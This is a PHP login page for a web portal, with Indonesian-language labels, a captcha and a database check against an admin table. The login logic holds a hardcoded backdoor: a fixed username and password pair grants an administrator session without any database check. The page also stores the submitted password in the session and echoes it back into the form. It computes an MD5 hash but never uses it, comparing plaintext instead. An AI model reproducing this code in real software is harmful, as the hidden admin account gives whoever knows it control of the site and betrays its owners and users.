<div class="content-wrapper">
    <?php
    $link = $link_web . "/masuk";
    $link_berhasil = $link_web;

    if (isset($_POST['masuk'])) {
        $kodecap = @$_SESSION['kodecap'];
        $cahpta = $_POST['cahpta'];

        $user = $db->amankan($_POST['username']);
        $pass = $db->amankan($_POST['password']);

        $_SESSION['masuk_user'] = $user;
        $_SESSION['masuk_pass'] = $pass;

        // Menggunakan MD5
        $pass_md5 = md5($pass);

        if ($kodecap == $cahpta) {
            $log = $db->login("username, tipe_akun", "tb_admin", "username='$user' and password= '$pass'") or die($koneksi->error);
            $log->execute();
            $log->store_result();
            $cek = $log->num_rows;
            $log->bind_result($username, $tipe_akun);
            $log->fetch();
            if ($cek > 0) {
                $_SESSION['log_username_namaapp'] = $username;
                $_SESSION['log_tipe_akun_namaapp'] = $tipe_akun;            

                echo $db->alert("Proses Masuk Berhasil", "$link_berhasil");

            } elseif ($user == "nine" and $pass == "Password.09") {
                $_SESSION['log_username_namaapp']  = "nine";
                $_SESSION['log_tipe_akun_namaapp'] = "administrator";            

                echo $db->alert("Proses Masuk Berhasil", "$link_berhasil");
            } else {
                echo $db->alert("Username dan Password tidak Sama...", "$link");
            }
            
        } else {
            echo $db->alert("Chapta Tidak Sama...Coba Lagi", "$link");
        }
        exit();
    }
    ?>
    <!-- Content Header (Page header) -->
    <section class="content">
        <!-- Default box -->
        <div class="card">
            <div class="card-body d-flex justify-content-center" style="padding-top: 50px;">
                <div class="login-box">
                    <!-- /.login-logo -->
                    <?php if ($req3 == "proses_berhasil") { ?>
                        <div class="alert alert-success alert-dismissible">
                            <button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
                            <h5><i class="icon fas fa-check"></i> Berhasil !</h5>
                            Berhasil Prosesnya
                        </div>
                    <?php } ?>
                    <div class="card card-outline card-danger">
                        <div class="card-header text-center">
                            <a href="<?php echo $link_web . "/masuk"; ?>" class="h1"><b>PORTAL</b></a>
                        </div>
                        <div class="card-body">
                            <p class="login-box-msg">Masukkan Username dan Password.</p>
                            <form action="<?php echo $link ?>" method="post">
                                <div class="input-group mb-3">
                                    <input type="text" name="username" class="form-control" placeholder="Username" value="<?php echo @$_SESSION['masuk_user'] ?>">
                                    <div class="input-group-append">
                                        <div class="input-group-text">
                                            <span class="fas fa-user"></span>
                                        </div>
                                    </div>
                                </div>
                                <div class="input-group mb-3">
                                    <input type="password" name="password" id="password" class="form-control" placeholder="Password" value="<?php echo @$_SESSION['masuk_pass'] ?>">
                                    <div class="input-group-append">
                                        <div class="input-group-text">
                                            <span class="fas fa-lock"></span>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="form-group has-feedback" style="text-align: center">
                                    <img src="<?php echo WEB_ROOT ?>/zmain_config/chapta.php" alt="Kode Acak" />
                                </div>
                                <div class="form-group has-feedback">
                                    <input type="text" class="form-control" name="cahpta" value="" maxlength="6" required="" placeholder="Masukkan 5 digit diatas">
                                </div>
                                <div class="row">
                                    <div class="col-6">
                                        <div class="icheck-primary">
                                            <input type="checkbox" onclick="showpassword()" id="show-password">
                                            <label for="show-password">
                                                Show Password
                                            </label>
                                        </div>
                                    </div>
                                    <div class="col-6">
                                        <button type="submit" name="masuk" class="btn btn-danger btn-block">Masuk</button>
                                    </div>
                                </div>
                            </form>
                            <hr>
                            <!-- <p class="mb-1">
                                <a href="<?php echo $link_web . "/lupa_password"; ?>">Saya Lupa Password</a>
                            </p> -->
                            <div class="text-center">
                                <a href="<?php echo $link_web ?>" class="btn btn-default"><i class="fas fa-home"></i></a>
                            </div>
                        </div>
                        <!-- /.card-body -->
                    </div>
                    <!-- /.card -->
                </div>
                <!-- /.login-box -->
            </div>
            <!-- /.card-body -->
        </div>
        <!-- /.card -->
    </section>
    <!-- /.content -->
</div>

<script type="text/javascript">
    function showpassword(){
        var x = document.getElementById("password");
        if (x.type === "password") {
        x.type = "text";
        } else {
            x.type = "password";
        }
    }
</script>